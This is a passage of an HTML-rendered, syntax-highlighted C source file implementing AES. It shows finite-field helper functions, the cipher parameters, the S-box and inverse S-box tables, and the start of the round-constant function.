class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Addition in GF(2^8)</span></span><br><span class="line"><span class="comment"> * http://en.wikipedia.org/wiki/Finite_field_arithmetic</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">gadd</span><span class="params">(<span class="keyword">uint8_t</span> a, <span class="keyword">uint8_t</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a ^ b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Subtraction in GF(2^8)</span></span><br><span class="line"><span class="comment"> * http://en.wikipedia.org/wiki/Finite_field_arithmetic</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">gsub</span><span class="params">(<span class="keyword">uint8_t</span> a, <span class="keyword">uint8_t</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a ^ b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Multiplication in GF(2^8)</span></span><br><span class="line"><span class="comment"> * http://en.wikipedia.org/wiki/Finite_field_arithmetic</span></span><br><span class="line"><span class="comment"> * Irreducible polynomial m(x) = x8 + x4 + x3 + x + 1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> This function can be easily replaced with a look up table for a speed </span></span><br><span class="line"><span class="comment"> *       boost, at the expense of an increase in memory size (around 65 KB). See</span></span><br><span class="line"><span class="comment"> *       the aes.h header file to find the macro definition.</span></span><br><span class="line"><span class="comment">uint8_t gmult(uint8_t a, uint8_t b) &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">uint8_t p = 0, i = 0, hbs = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">for (i = 0; i &lt; 8; i++) &#123;</span></span><br><span class="line"><span class="comment">if (b &amp; 1) &#123;</span></span><br><span class="line"><span class="comment">p ^= a;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">hbs = a &amp; 0x80;</span></span><br><span class="line"><span class="comment">a &lt;&lt;= 1;</span></span><br><span class="line"><span class="comment">if (hbs) a ^= 0x1b; // 0000 0001 0001 1011</span></span><br><span class="line"><span class="comment">b &gt;&gt;= 1;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">return (uint8_t)p;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Addition of 4 byte words</span></span><br><span class="line"><span class="comment"> * m(x) = x4+1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coef_add</span><span class="params">(<span class="keyword">uint8_t</span> a[], <span class="keyword">uint8_t</span> b[], <span class="keyword">uint8_t</span> d[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  d[<span class="number">0</span>] = a[<span class="number">0</span>] ^ b[<span class="number">0</span>];</span><br><span class="line">  d[<span class="number">1</span>] = a[<span class="number">1</span>] ^ b[<span class="number">1</span>];</span><br><span class="line">  d[<span class="number">2</span>] = a[<span class="number">2</span>] ^ b[<span class="number">2</span>];</span><br><span class="line">  d[<span class="number">3</span>] = a[<span class="number">3</span>] ^ b[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Multiplication of 4 byte words</span></span><br><span class="line"><span class="comment"> * m(x) = x4+1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coef_mult</span><span class="params">(<span class="keyword">uint8_t</span> *a, <span class="keyword">uint8_t</span> *b, <span class="keyword">uint8_t</span> *d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  d[<span class="number">0</span>] = gmult(a[<span class="number">0</span>], b[<span class="number">0</span>]) ^ gmult(a[<span class="number">3</span>], b[<span class="number">1</span>]) ^ gmult(a[<span class="number">2</span>], b[<span class="number">2</span>]) ^ gmult(a[<span class="number">1</span>], b[<span class="number">3</span>]);</span><br><span class="line">  d[<span class="number">1</span>] = gmult(a[<span class="number">1</span>], b[<span class="number">0</span>]) ^ gmult(a[<span class="number">0</span>], b[<span class="number">1</span>]) ^ gmult(a[<span class="number">3</span>], b[<span class="number">2</span>]) ^ gmult(a[<span class="number">2</span>], b[<span class="number">3</span>]);</span><br><span class="line">  d[<span class="number">2</span>] = gmult(a[<span class="number">2</span>], b[<span class="number">0</span>]) ^ gmult(a[<span class="number">1</span>], b[<span class="number">1</span>]) ^ gmult(a[<span class="number">0</span>], b[<span class="number">2</span>]) ^ gmult(a[<span class="number">3</span>], b[<span class="number">3</span>]);</span><br><span class="line">  d[<span class="number">3</span>] = gmult(a[<span class="number">3</span>], b[<span class="number">0</span>]) ^ gmult(a[<span class="number">2</span>], b[<span class="number">1</span>]) ^ gmult(a[<span class="number">1</span>], b[<span class="number">2</span>]) ^ gmult(a[<span class="number">0</span>], b[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The cipher Key.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> K;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of columns (32-bit words) comprising the State. For this </span></span><br><span class="line"><span class="comment"> * standard, Nb = 4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Nb = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of 32-bit words comprising the Cipher Key. For this </span></span><br><span class="line"><span class="comment"> * standard, Nk = 4, 6, or 8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> Nk;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of rounds, which is a function of  Nk  and  Nb (which is </span></span><br><span class="line"><span class="comment"> * fixed). For this standard, Nr = 10, 12, or 14.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> Nr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * S-box transformation table</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> s_box[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="comment">// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f</span></span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>,</span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>,</span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>,</span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>,</span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>,</span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>,</span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>,</span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>,</span><br><span class="line">  <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>&#125;; <span class="comment">// f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Inverse S-box transformation table</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> inv_s_box[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="comment">// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f</span></span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>, <span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>,</span><br><span class="line">  <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>,</span><br><span class="line">  <span class="number">0xE9</span>, <span class="number">0xCB</span>, <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>,</span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>, <span class="number">0x08</span>, <span class="number">0x2E</span>,</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>,</span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>, <span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>,</span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x06</span>, <span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>, <span class="number">0x3A</span>, <span class="number">0x91</span>,</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>, <span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>,</span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>, <span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>,</span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xF4</span>, <span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>, <span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span>&#125;; <span class="comment">// f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generates the round constant Rcon[i]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> R[] = &#123;<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">Rcon</span><span class="params">(<span class="keyword">uint8_t</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    R[<span class="number">0</span>] = <span class="number">0x01</span>; <span class="comment">// x^(1-1) = x^0 = 1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span 